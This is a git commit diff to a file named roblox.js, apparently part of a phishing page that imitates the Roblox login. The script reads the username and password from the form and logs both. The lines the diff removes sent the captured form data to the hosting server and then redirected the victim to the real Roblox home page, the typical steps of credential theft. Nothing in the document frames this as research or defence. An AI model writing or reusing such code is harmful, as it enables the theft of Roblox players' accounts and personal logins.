e823401330263d246d03a83307ae734c13c7a5ab
M2Busto <121911586+M2Busto@users.noreply.github.com>
2023-01-09 17:07:37 +0000

    Update roblox.js

--- static/roblox.js
+++ static/roblox.js
@@ -1,18 +1,10 @@
 const Form = document.querySelector("#details-form")
 
-function GetDetails() {
+Form.addEventListener("submit", (e) => {
     const UserNameOrEmailOrPhone = String(document.querySelector("#login-email").value)
     const Password = String(document.querySelector("#login-password").value)
     if (UserNameOrEmailOrPhone != "" && Password != "") {
-        console.log("UserNameOrEmailOrPhone: " + UserNameOrEmailOrPhone)
+        console.log("User: " + UserNameOrEmailOrPhone)
         console.log("Password: " + Password)
-        fetch("/", {
-            method: "POST",
-            body: JSON.stringify(Object.fromEntries(new FormData(Form))),
-            headers: {
-                "Content-Type" : "application/json",
-            },
-        })
-        location.href = "https://www.roblox.com/home"
     }
-}
+})
